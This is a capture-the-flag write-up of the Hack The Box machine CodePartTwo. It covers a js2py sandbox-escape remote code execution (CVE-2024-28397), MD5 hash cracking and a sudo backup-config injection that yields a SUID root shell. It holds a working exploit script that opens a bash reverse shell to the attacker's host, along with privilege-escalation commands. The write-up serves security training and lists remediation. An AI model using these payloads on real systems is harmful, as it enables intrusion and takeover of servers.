# CodePartTwo — Hack The Box

![CodePartTwo](../images/CodePartTwo.png)

![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)
![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Season: 8](https://img.shields.io/badge/Season-8-orange)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | CodePartTwo |
| **IP Address** | 10.10.11.82 |
| **Operating System** | Linux (Ubuntu 20.04) |
| **Difficulty** | Easy |
| **Key Vulnerabilities** | CVE-2024-28397 (js2py RCE), Weak password hashes, Sudo misconfiguration |

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Foothold](#initial-foothold)
4. [Lateral Movement](#lateral-movement)
5. [Privilege Escalation](#privilege-escalation)
6. [Remediation](#remediation)
7. [Lessons Learned](#lessons-learned)

---

## Reconnaissance

### Port Scanning

Initial **nmap** scan to discover open ports:

```bash
nmap -sC -sV -p- --min-rate 5000 10.10.11.82 -oN nmap_scan.txt
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
```

**Key Findings:**
- **SSH (Port 22):** OpenSSH 8.2p1 - No known critical vulnerabilities, potential entry point if credentials found
- **HTTP (Port 8000):** Gunicorn 20.0.4 - Python WSGI HTTP server, likely running a Flask/Django application

---

## Enumeration

### Web Application Analysis

Navigating to `http://10.10.11.82:8000` revealed:
- Login page
- Registration functionality
- **"Download App" button** ← Critical finding!

### Source Code Disclosure

Clicking "Download App" provided `app.zip` containing the complete application source code:

```
app/
├── app.py                  # Main application code
├── instance/
│   └── users.db           # SQLite database
├── requirements.txt        # Python dependencies
├── static/
│   ├── css/
│   └── js/
└── templates/
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html
```

### Dependency Analysis

**requirements.txt contents:**

```
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

🚨 **Critical Finding:** `js2py==0.74` is vulnerable to **CVE-2024-28397** (Sandbox Escape leading to Remote Code Execution)

### Vulnerable Endpoint Discovery

Analyzing `app.py` revealed the vulnerable code path:

```python
import js2py
js2py.disable_pyimport()  # Attempted security measure (insufficient!)

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)  # ← VULNERABLE LINE
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

**Vulnerability Summary:**
- No authentication required
- Accepts arbitrary JavaScript code via POST
- CVE-2024-28397 allows sandbox escape to execute Python code
- Python's `subprocess` module accessible → RCE

---

## Initial Foothold

### CVE-2024-28397: js2py Sandbox Escape

**Vulnerability:** js2py attempts to sandbox JavaScript execution but fails to prevent access to Python's internal object hierarchy.

### Exploitation Process

#### Step 1: Test Endpoint Accessibility

```bash
curl -X POST http://10.10.11.82:8000/run_code \
  -H "Content-Type: application/json" \
  -d '{"code": "1 + 1"}'
```

**Response:**
```json
{"result":2}
```

✅ Endpoint is accessible and executing code!

#### Step 2: Craft Reverse Shell Payload

Created `exploit.sh`:

```bash
#!/bin/bash

LHOST="10.10.14.51"  # Attacker IP
LPORT="6767"
TARGET="http://10.10.11.82:8000/run_code"

curl -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  --data-binary @- << 'EOF'
{
  "code": "let cmd = 'bash -c \"bash -i >& /dev/tcp/10.10.14.51/6767 0>&1\"'; let getattr = Object.getOwnPropertyNames({}).__class__.__base__.__getattribute__; let obj = getattr(getattr, '__class__').__base__; function findpopen(o) { for(let i in o.__subclasses__()) { let item = o.__subclasses__()[i]; if(item.__module__ == 'subprocess' && item.__name__ == 'Popen') { return item; } } } findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();"
}
EOF
```

**Payload Breakdown:**

1. **JavaScript Command:** `bash -c 'bash -i >& /dev/tcp/10.10.14.51/6767 0>&1'`
2. **Sandbox Escape:** Access Python's object hierarchy via `__class__.__base__.__getattribute__`
3. **Find subprocess.Popen:** Recursively search Python's class hierarchy
4. **Execute:** Call Popen with our reverse shell command

#### Step 3: Set Up Listener and Execute

**Terminal 1 (Listener):**
```bash
nc -lvnp 6767
```

**Terminal 2 (Exploit):**
```bash
chmod +x exploit.sh
./exploit.sh
```

**Result:**
```
listening on [any] 6767 ...
connect to [10.10.14.51] from (UNKNOWN) [10.10.11.82] 60172
app@codeparttwo:~/app$
```

✅ **Shell obtained as user `app`!**

### Shell Upgrade (Optional but Recommended)

```bash
# In reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z

# In local terminal
stty raw -echo; fg

# Back in reverse shell
export TERM=xterm
```

---

## Lateral Movement

### Database Enumeration

Located SQLite database in the application directory:

```bash
app@codeparttwo:~/app/instance$ ls
users.db
```

### Extracting User Credentials

```bash
sqlite3 users.db "SELECT * FROM user;"
```

**Output:**
```
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

**Findings:**
- Two users: `marco` and `app`
- Password hashes appear to be MD5 (32 hex characters, no salt)

### Hash Cracking

**Step 1: Identify Hash Type**

```bash
echo "649c9d65a206a75f5abe509fe128bce5" > hashes.txt
echo "a97588c0e2fa3a024876339e27aeb42e" >> hashes.txt

hashid -m hashes.txt
```

**Result:** MD5 (Hashcat Mode: 0)

**Step 2: Crack with Hashcat**

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Cracked Password:**
```
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```

✅ **Credentials:** `marco:sweetangelbabylove`

### SSH Access as Marco

```bash
ssh marco@10.10.11.82
# Password: sweetangelbabylove
```

```bash
marco@codeparttwo:~$ cat user.txt
498b1aa54853a59973598b28f9dff4ee
```

🚩 **User Flag Captured!**

---

## Privilege Escalation

### Sudo Enumeration

```bash
marco@codeparttwo:~$ sudo -l
```

**Output:**
```
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

🚨 **Critical Finding:** Marco can run `npbackup-cli` as root without a password!

### Analyzing npbackup.conf

```bash
marco@codeparttwo:~$ ls -la
-rw-rw-r-- 1 marco marco 2893 Nov  2 07:23 npbackup.conf
```

✅ Configuration file is **writable** by marco!

**Key Configuration Parameter:**

```yaml
groups:
  default_group:
    backup_opts:
      pre_exec_commands: []  # ← Commands executed BEFORE backup runs!
```

### Exploitation Strategy

**Attack Vector:** Inject malicious commands into `pre_exec_commands` that will execute as root when `npbackup-cli` runs with sudo.

**Goal:** Set SUID bit on bash to gain root shell access.

### Privilege Escalation Execution

**Step 1: Modify Configuration**

```bash
sed -i 's/pre_exec_commands: \[\]/pre_exec_commands: ["cp \/bin\/bash \/tmp\/rootbash", "chmod 4755 \/tmp\/rootbash"]/' npbackup.conf
```

**Verify:**
```bash
grep "pre_exec_commands" npbackup.conf
```

**Output:**
```yaml
pre_exec_commands: ["cp /bin/bash /tmp/rootbash", "chmod 4755 /tmp/rootbash"]
```

**Step 2: Execute Backup as Root**

```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b
```

The backup will execute our injected commands as root:
1. Copy `/bin/bash` to `/tmp/rootbash`
2. Set SUID bit (4755) on the copy

**Step 3: Verify SUID Bash**

```bash
ls -la /tmp/rootbash
```

**Output:**
```
-rwsr-xr-x 1 root root 1183448 Nov  2 09:37 /tmp/rootbash
    ^
    └─ SUID bit set! (the 's')
```

**Step 4: Spawn Root Shell**

```bash
/tmp/rootbash -p  # -p flag preserves privileges
```

**Verification:**
```bash
rootbash-5.0# whoami
root

rootbash-5.0# id
uid=1000(marco) gid=1000(marco) euid=0(root) groups=1000(marco),1003(backups)
```

✅ **Effective UID = 0 (root)**

### Capture Root Flag

```bash
rootbash-5.0# cat /root/root.txt
[ROOT FLAG HERE]
```

🚩 **Root Flag Captured!**

---

## Remediation

### Critical Vulnerabilities

1. **CVE-2024-28397 (js2py Sandbox Escape)**
   - **Fix:** Update js2py to a patched version or replace with a safer code execution solution
   - **Mitigation:** Implement input validation, sandboxing, and authentication on the `/run_code` endpoint
   
2. **Weak Password Storage**
   - **Fix:** Use strong hashing algorithms (bcrypt, Argon2) with salts
   - **Never:** Store passwords in MD5 or any fast hashing algorithm

3. **Sudo Misconfiguration**
   - **Fix:** Remove NOPASSWD from sudoers or restrict command parameters
   - **Principle:** Least privilege - don't allow arbitrary config file execution

4. **Writable Configuration Files**
   - **Fix:** Configuration files used by sudo commands should be owned by root and read-only
   - **Permissions:** `-r--r--r-- root root` for config files

### Security Best Practices

| Issue | Recommendation |
|-------|----------------|
| **Exposed Development Services** | Never expose Gunicorn directly; use Nginx/Apache as reverse proxy |
| **Source Code Disclosure** | Don't provide downloadable application source code in production |
| **Authentication** | Implement proper authentication on all sensitive endpoints |
| **Input Validation** | Sanitize and validate all user inputs |
| **Dependency Management** | Regularly audit and update dependencies using tools like `pip-audit` |
| **Configuration Security** | Store sensitive configs outside web root, use environment variables |
| **Privilege Separation** | Run web applications with minimal privileges |

---

## Lessons Learned

### Technical Skills Acquired

✅ **Reconnaissance & Enumeration**
- Port scanning with nmap
- Web application analysis
- Source code review
- Dependency vulnerability research

✅ **Exploitation**
- CVE research and PoC adaptation
- Sandbox escape techniques
- Reverse shell crafting
- Payload delivery via API endpoints

✅ **Post-Exploitation**
- SQLite database enumeration
- Password hash identification
- Hash cracking with hashcat
- Lateral movement via credential reuse

✅ **Privilege Escalation**
- Sudo enumeration (`sudo -l`)
- Configuration file manipulation
- SUID binary exploitation
- Command injection in privileged contexts

### CTF Methodology

1. **Always download and analyze source code** when available
2. **Check dependencies** for known vulnerabilities (CVE databases)
3. **Enumerate databases** for credentials and sensitive data
4. **Crack weak hashes** with tools like hashcat/john
5. **Check sudo privileges** immediately after gaining user access
6. **Analyze writable configuration files** used by privileged processes
7. **Test configuration injection** in backup/admin tools

### Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| curl | HTTP request crafting and API testing |
| sqlite3 | Database querying |
| hashid | Hash type identification |
| hashcat | Password hash cracking |
| netcat | Reverse shell listener |
| ssh | Remote access |
| sed | Configuration file manipulation |

---

## Attack Chain Summary

```
1. Nmap Scan
   └─> Discovered Gunicorn on port 8000

2. Web Enumeration
   └─> Downloaded source code (app.zip)

3. Source Code Analysis
   └─> Found js2py==0.74 in requirements.txt

4. Vulnerability Research
   └─> Identified CVE-2024-28397 (RCE)

5. Initial Exploitation
   └─> Reverse shell as 'app' user

6. Database Enumeration
   └─> Extracted MD5 password hashes

7. Hash Cracking
   └─> Cracked marco's password: sweetangelbabylove

8. Lateral Movement
   └─> SSH as marco → User flag captured

9. Sudo Enumeration
   └─> Found NOPASSWD: /usr/local/bin/npbackup-cli

10. Configuration Injection
    └─> Modified npbackup.conf with pre_exec_commands

11. Privilege Escalation
    └─> Created SUID bash via sudo npbackup-cli

12. Root Shell
    └─> Executed /tmp/rootbash -p → Root flag captured
```

---

## References

- [CVE-2024-28397 - js2py Sandbox Escape](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)
- [HackTheBox Platform](https://www.hackthebox.com/)
- [GTFOBins - Sudo Privilege Escalation](https://gtfobins.github.io/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

## Tags

`#HackTheBox` `#CTF` `#Linux` `#PrivilegeEscalation` `#CVE-2024-28397` `#js2py` `#WebExploitation` `#PenetrationTesting` `#OSCP-like`

---

**Box Completed:** November 2, 2025  
**Difficulty Rating:** Easy  
**Skills Required:** Basic web enumeration, source code analysis, Linux privilege escalation  
**Skills Learned:** CVE exploitation, configuration injection, SUID abuse

---

*This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities.*
